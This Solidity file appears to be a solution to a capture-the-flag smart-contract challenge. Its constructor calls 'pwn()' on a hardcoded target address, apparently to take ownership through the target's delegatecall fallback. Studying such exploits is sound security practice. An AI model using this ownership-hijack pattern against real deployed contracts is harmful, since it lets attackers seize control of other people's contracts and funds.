// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Delegate {

    address delegateSC = 0x9793382f69AeDA078a9f4850179563881B67CF3c;

    constructor() {
       (bool sent,) = payable(delegateSC).call{value : 0}(abi.encodeWithSignature("pwn()"));
       require(sent);
    }  
}